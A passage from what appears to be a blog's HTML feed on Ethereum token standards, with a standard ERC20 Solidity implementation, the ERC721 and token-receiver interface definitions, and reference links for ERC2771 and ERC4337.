class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../../math/SafeMath.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> Standard ERC20 token</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev</span> Implementation of the basic standard token.</span></span><br><span class="line"><span class="comment"> * https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</span></span><br><span class="line"><span class="comment"> * Originally based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">ERC20</span> is <span class="title class_">IERC20</span> &#123;</span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) <span class="keyword">private</span> _balances;</span><br><span class="line"></span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256)) <span class="keyword">private</span> _allowed;</span><br><span class="line"></span><br><span class="line">  uint256 <span class="keyword">private</span> _totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@dev</span> Total number of tokens in existence</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">totalSupply</span>(<span class="params"></span>) <span class="keyword">public</span> view returns (uint256) &#123;</span><br><span class="line">    <span class="keyword">return</span> _totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@dev</span> Gets the balance of the specified address.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> owner The address to query the balance of.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> An uint256 representing the amount owned by the passed address.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address owner</span>) <span class="keyword">public</span> view returns (uint256) &#123;</span><br><span class="line">    <span class="keyword">return</span> _balances[owner];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Function to check the amount of tokens that an owner allowed to a spender.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> owner address The address which owns the funds.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> spender address The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> A uint256 specifying the amount of tokens still available for the spender.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">allowance</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address owner,</span></span><br><span class="line"><span class="params">    address spender</span></span><br><span class="line"><span class="params">   </span>)</span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> _allowed[owner][spender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@dev</span> Transfer token for a specified address</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> to The address to transfer to.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> value The amount to be transferred.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 value</span>) <span class="keyword">public</span> returns (bool) &#123;</span><br><span class="line">    <span class="built_in">require</span>(value &lt;= _balances[msg.<span class="property">sender</span>]);</span><br><span class="line">    <span class="built_in">require</span>(to != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    _balances[msg.<span class="property">sender</span>] = _balances[msg.<span class="property">sender</span>].<span class="title function_">sub</span>(value);</span><br><span class="line">    _balances[to] = _balances[to].<span class="title function_">add</span>(value);</span><br><span class="line">    emit <span class="title class_">Transfer</span>(msg.<span class="property">sender</span>, to, value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.</span></span><br><span class="line"><span class="comment">   * Beware that changing an allowance with this method brings the risk that someone may use both the old</span></span><br><span class="line"><span class="comment">   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this</span></span><br><span class="line"><span class="comment">   * race condition is to first reduce the spender&#x27;s allowance to 0 and set the desired value afterwards:</span></span><br><span class="line"><span class="comment">   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> spender The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> value The amount of tokens to be spent.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint256 value</span>) <span class="keyword">public</span> returns (bool) &#123;</span><br><span class="line">    <span class="built_in">require</span>(spender != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    _allowed[msg.<span class="property">sender</span>][spender] = value;</span><br><span class="line">    emit <span class="title class_">Approval</span>(msg.<span class="property">sender</span>, spender, value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Transfer tokens from one address to another</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> from address The address which you want to send tokens from</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> to address The address which you want to transfer to</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> value uint256 the amount of tokens to be transferred</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">    address to,</span></span><br><span class="line"><span class="params">    uint256 value</span></span><br><span class="line"><span class="params">  </span>)</span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">require</span>(value &lt;= _balances[<span class="keyword">from</span>]);</span><br><span class="line">    <span class="built_in">require</span>(value &lt;= _allowed[<span class="keyword">from</span>][msg.<span class="property">sender</span>]);</span><br><span class="line">    <span class="built_in">require</span>(to != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    _balances[<span class="keyword">from</span>] = _balances[<span class="keyword">from</span>].<span class="title function_">sub</span>(value);</span><br><span class="line">    _balances[to] = _balances[to].<span class="title function_">add</span>(value);</span><br><span class="line">    _allowed[<span class="keyword">from</span>][msg.<span class="property">sender</span>] = _allowed[<span class="keyword">from</span>][msg.<span class="property">sender</span>].<span class="title function_">sub</span>(value);</span><br><span class="line">    emit <span class="title class_">Transfer</span>(<span class="keyword">from</span>, to, value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Increase the amount of tokens that an owner allowed to a spender.</span></span><br><span class="line"><span class="comment">   * approve should be called when allowed_[_spender] == 0. To increment</span></span><br><span class="line"><span class="comment">   * allowed value is better to use this function to avoid 2 calls (and wait until</span></span><br><span class="line"><span class="comment">   * the first transaction is mined)</span></span><br><span class="line"><span class="comment">   * From MonolithDAO Token.sol</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> spender The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> addedValue The amount of tokens to increase the allowance by.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">increaseAllowance</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address spender,</span></span><br><span class="line"><span class="params">    uint256 addedValue</span></span><br><span class="line"><span class="params">  </span>)</span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">require</span>(spender != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    _allowed[msg.<span class="property">sender</span>][spender] = (</span><br><span class="line">      _allowed[msg.<span class="property">sender</span>][spender].<span class="title function_">add</span>(addedValue));</span><br><span class="line">    emit <span class="title class_">Approval</span>(msg.<span class="property">sender</span>, spender, _allowed[msg.<span class="property">sender</span>][spender]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Decrease the amount of tokens that an owner allowed to a spender.</span></span><br><span class="line"><span class="comment">   * approve should be called when allowed_[_spender] == 0. To decrement</span></span><br><span class="line"><span class="comment">   * allowed value is better to use this function to avoid 2 calls (and wait until</span></span><br><span class="line"><span class="comment">   * the first transaction is mined)</span></span><br><span class="line"><span class="comment">   * From MonolithDAO Token.sol</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> spender The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> subtractedValue The amount of tokens to decrease the allowance by.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">decreaseAllowance</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address spender,</span></span><br><span class="line"><span class="params">    uint256 subtractedValue</span></span><br><span class="line"><span class="params">  </span>)</span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">require</span>(spender != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    _allowed[msg.<span class="property">sender</span>][spender] = (</span><br><span class="line">      _allowed[msg.<span class="property">sender</span>][spender].<span class="title function_">sub</span>(subtractedValue));</span><br><span class="line">    emit <span class="title class_">Approval</span>(msg.<span class="property">sender</span>, spender, _allowed[msg.<span class="property">sender</span>][spender]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Internal function that mints an amount of the token and assigns it to</span></span><br><span class="line"><span class="comment">   * an account. This encapsulates the modification of balances such that the</span></span><br><span class="line"><span class="comment">   * proper events are emitted.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> account The account that will receive the created tokens.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> amount The amount that will be created.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_mint</span>(<span class="params">address account, uint256 amount</span>) internal &#123;</span><br><span class="line">    <span class="built_in">require</span>(account != <span class="number">0</span>);</span><br><span class="line">    _totalSupply = _totalSupply.<span class="title function_">add</span>(amount);</span><br><span class="line">    _balances[account] = _balances[account].<span class="title function_">add</span>(amount);</span><br><span class="line">    emit <span class="title class_">Transfer</span>(<span class="title function_">address</span>(<span class="number">0</span>), account, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Internal function that burns an amount of the token of a given</span></span><br><span class="line"><span class="comment">   * account.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> account The account whose tokens will be burnt.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> amount The amount that will be burnt.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_burn</span>(<span class="params">address account, uint256 amount</span>) internal &#123;</span><br><span class="line">    <span class="built_in">require</span>(account != <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">require</span>(amount &lt;= _balances[account]);</span><br><span class="line"></span><br><span class="line">    _totalSupply = _totalSupply.<span class="title function_">sub</span>(amount);</span><br><span class="line">    _balances[account] = _balances[account].<span class="title function_">sub</span>(amount);</span><br><span class="line">    emit <span class="title class_">Transfer</span>(account, <span class="title function_">address</span>(<span class="number">0</span>), amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Internal function that burns an amount of the token of a given</span></span><br><span class="line"><span class="comment">   * account, deducting from the sender&#x27;s allowance for said account. Uses the</span></span><br><span class="line"><span class="comment">   * internal burn function.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> account The account whose tokens will be burnt.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> amount The amount that will be burnt.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_burnFrom</span>(<span class="params">address account, uint256 amount</span>) internal &#123;</span><br><span class="line">    <span class="built_in">require</span>(amount &lt;= _allowed[account][msg.<span class="property">sender</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Should https://github.com/OpenZeppelin/zeppelin-solidity/issues/707 be accepted,</span></span><br><span class="line">    <span class="comment">// this function needs to emit an event with the updated approval.</span></span><br><span class="line">    _allowed[account][msg.<span class="property">sender</span>] = _allowed[account][msg.<span class="property">sender</span>].<span class="title function_">sub</span>(</span><br><span class="line">      amount);</span><br><span class="line">    <span class="title function_">_burn</span>(account, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://eips.ethereum.org/EIPS/eip-20">https://eips.ethereum.org/EIPS/eip-20</a></li><li><a href="https://wizard.openzeppelin.com/#erc20">https://wizard.openzeppelin.com/#erc20</a></li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts">https://github.com/OpenZeppelin/openzeppelin-contracts</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ERC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC2771 Secure Protocol for Native Meta Transactions</title>
      <link href="/2023/04/18/crypto/ERC2771/"/>
      <url>/2023/04/18/crypto/ERC2771/</url>
      
        <content type="html"><![CDATA[<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://eips.ethereum.org/EIPS/eip-2271">https://eips.ethereum.org/EIPS/eip-2271</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ERC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC4337</title>
      <link href="/2023/04/18/crypto/ERC4337/"/>
      <url>/2023/04/18/crypto/ERC4337/</url>
      
        <content type="html"><![CDATA[<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://eips.ethereum.org/EIPS/eip-4337">https://eips.ethereum.org/EIPS/eip-4337</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ERC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC721 Non-Fungible Token Standard</title>
      <link href="/2023/04/18/crypto/ERC721/"/>
      <url>/2023/04/18/crypto/ERC721/</url>
      
        <content type="html"><![CDATA[<h2 id="协议定义"><a href="#协议定义" class="headerlink" title="协议定义"></a>协议定义</h2><h3 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// @title ERC-721 Non-Fungible Token Standard</span></span><br><span class="line"><span class="comment">/// @dev See https://eips.ethereum.org/EIPS/eip-721</span></span><br><span class="line"><span class="comment">///  Note: the ERC-165 identifier for this interface is 0x80ac58cd.</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ERC721</span> /* is <span class="title class_">ERC165</span> */ &#123;</span><br><span class="line">    <span class="comment">/// @notice Count all NFTs assigned to an owner</span></span><br><span class="line">    <span class="comment">/// @dev NFTs assigned to the zero address are considered invalid, and this</span></span><br><span class="line">    <span class="comment">///  function throws for queries about the zero address.</span></span><br><span class="line">    <span class="comment">/// @param _owner An address for whom to query the balance</span></span><br><span class="line">    <span class="comment">/// @return The number of NFTs owned by `_owner`, possibly zero</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address _owner</span>) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice Find the owner of an NFT</span></span><br><span class="line">    <span class="comment">/// @dev NFTs assigned to zero address are considered invalid, and queries</span></span><br><span class="line">    <span class="comment">///  about them do throw.</span></span><br><span class="line">    <span class="comment">/// @param _tokenId The identifier for an NFT</span></span><br><span class="line">    <span class="comment">/// @return The address of the owner of the NFT</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">ownerOf</span>(<span class="params">uint256 _tokenId</span>) external view returns (address);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice Transfers the ownership of an NFT from one address to another address</span></span><br><span class="line">    <span class="comment">/// @dev Throws unless `msg.sender` is the current owner, an authorized</span></span><br><span class="line">    <span class="comment">///  operator, or the approved address for this NFT. Throws if `_from` is</span></span><br><span class="line">    <span class="comment">///  not the current owner. Throws if `_to` is the zero address. Throws if</span></span><br><span class="line">    <span class="comment">///  `_tokenId` is not a valid NFT. When transfer is complete, this function</span></span><br><span class="line">    <span class="comment">///  checks if `_to` is a smart contract (code size &gt; 0). If so, it calls</span></span><br><span class="line">    <span class="comment">///  `onERC721Received` on `_to` and throws if the return value is not</span></span><br><span class="line">    <span class="comment">///  `bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))`.</span></span><br><span class="line">    <span class="comment">/// @param _from The current owner of the NFT</span></span><br><span class="line">    <span class="comment">/// @param _to The new owner</span></span><br><span class="line">    <span class="comment">/// @param _tokenId The NFT to transfer</span></span><br><span class="line">    <span class="comment">/// @param data Additional data with no specified format, sent in call to `_to`</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">safeTransferFrom</span>(<span class="params">address _from, address _to, uint256 _tokenId, bytes data</span>) external payable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice Transfers the ownership of an NFT from one address to another address</span></span><br><span class="line">    <span class="comment">/// @dev This works identically to the other function with an extra data parameter,</span></span><br><span class="line">    <span class="comment">///  except this function just sets data to &quot;&quot;.</span></span><br><span class="line">    <span class="comment">/// @param _from The current owner of the NFT</span></span><br><span class="line">    <span class="comment">/// @param _to The new owner</span></span><br><span class="line">    <span class="comment">/// @param _tokenId The NFT to transfer</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">safeTransferFrom</span>(<span class="params">address _from, address _to, uint256 _tokenId</span>) external payable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice Transfer ownership of an NFT -- THE CALLER IS RESPONSIBLE</span></span><br><span class="line">    <span class="comment">///  TO CONFIRM THAT `_to` IS CAPABLE OF RECEIVING NFTS OR ELSE</span></span><br><span class="line">    <span class="comment">///  THEY MAY BE PERMANENTLY LOST</span></span><br><span class="line">    <span class="comment">/// @dev Throws unless `msg.sender` is the current owner, an authorized</span></span><br><span class="line">    <span class="comment">///  operator, or the approved address for this NFT. Throws if `_from` is</span></span><br><span class="line">    <span class="comment">///  not the current owner. Throws if `_to` is the zero address. Throws if</span></span><br><span class="line">    <span class="comment">///  `_tokenId` is not a valid NFT.</span></span><br><span class="line">    <span class="comment">/// @param _from The current owner of the NFT</span></span><br><span class="line">    <span class="comment">/// @param _to The new owner</span></span><br><span class="line">    <span class="comment">/// @param _tokenId The NFT to transfer</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address _from, address _to, uint256 _tokenId</span>) external payable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice Change or reaffirm the approved address for an NFT</span></span><br><span class="line">    <span class="comment">/// @dev The zero address indicates there is no approved address.</span></span><br><span class="line">    <span class="comment">///  Throws unless `msg.sender` is the current NFT owner, or an authorized</span></span><br><span class="line">    <span class="comment">///  operator of the current owner.</span></span><br><span class="line">    <span class="comment">/// @param _approved The new approved NFT controller</span></span><br><span class="line">    <span class="comment">/// @param _tokenId The NFT to approve</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address _approved, uint256 _tokenId</span>) external payable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice Enable or disable approval for a third party (&quot;operator&quot;) to manage</span></span><br><span class="line">    <span class="comment">///  all of `msg.sender`&#x27;s assets</span></span><br><span class="line">    <span class="comment">/// @dev Emits the ApprovalForAll event. The contract MUST allow</span></span><br><span class="line">    <span class="comment">///  multiple operators per owner.</span></span><br><span class="line">    <span class="comment">/// @param _operator Address to add to the set of authorized operators</span></span><br><span class="line">    <span class="comment">/// @param _approved True if the operator is approved, false to revoke approval</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setApprovalForAll</span>(<span class="params">address _operator, bool _approved</span>) external;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice Get the approved address for a single NFT</span></span><br><span class="line">    <span class="comment">/// @dev Throws if `_tokenId` is not a valid NFT.</span></span><br><span class="line">    <span class="comment">/// @param _tokenId The NFT to find the approved address for</span></span><br><span class="line">    <span class="comment">/// @return The approved address for this NFT, or the zero address if there is none</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getApproved</span>(<span class="params">uint256 _tokenId</span>) external view returns (address);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice Query if an address is an authorized operator for another address</span></span><br><span class="line">    <span class="comment">/// @param _owner The address that owns the NFTs</span></span><br><span class="line">    <span class="comment">/// @param _operator The address that acts on behalf of the owner</span></span><br><span class="line">    <span class="comment">/// @return True if `_operator` is an approved operator for `_owner`, false otherwise</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isApprovedForAll</span>(<span class="params">address _owner, address _operator</span>) external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ERC165</span> &#123;</span><br><span class="line">    <span class="comment">/// @notice Query if a contract implements an interface</span></span><br><span class="line">    <span class="comment">/// @param interfaceID The interface identifier, as specified in ERC-165</span></span><br><span class="line">    <span class="comment">/// @dev Interface identification is specified in ERC-165. This function</span></span><br><span class="line">    <span class="comment">///  uses less than 30,000 gas.</span></span><br><span class="line">    <span class="comment">/// @return `true` if the contract implements `interfaceID` and</span></span><br><span class="line">    <span class="comment">///  `interfaceID` is not 0xffffffff, `false` otherwise</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">supportsInterface</span>(<span class="params">bytes4 interfaceID</span>) external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// @dev Note: the ERC-165 identifier for this interface is 0x150b7a02.</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ERC721TokenReceiver</span> &#123;</span><br><span class="line">    <span class="comment">/// @notice Handle the receipt of an NFT</span></span><br><span class="line">    <span class="comment">/// @dev The ERC721 smart contract calls this function on the recipient</span></span><br><span class="line">    <span class="comment">///  after a `transfer`. This function MAY throw to revert and reject the</span></span><br><span class="line">    <span class="comment">///  transfer. Return of other than the magic value MUST result in the</span></span><br><span class="line">    <span class="comment">///  transaction being reverted.</span></span><br><span class="line">    <span class="comment">///  Note: the contract address is always the message sender.</span></span><br><span class="line">    <span class="comment">/// @param _operator The address which called `safeTransferFrom` function</span></span><br><span class="line">    <span class="comment">/// @param _from The address which previously owned the token</span></span><br><span class="line">    <span class="comment">/// @param _tokenId The NFT identifier which is being transferred</span></span><br><span class="line">    <span class="comment">/// @param _data Additional data with no specified format</span></span><br><span class="line">    <span class="comment">/// @return `bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))`</span></span><br><span class="line">    <span class="comment">///  unless throwing</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">onERC721Received</span>(<span class="params">address _operator, address _from, uint256 _tokenId, bytes _data</span>) external <span class="title function_">returns</span>(bytes4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 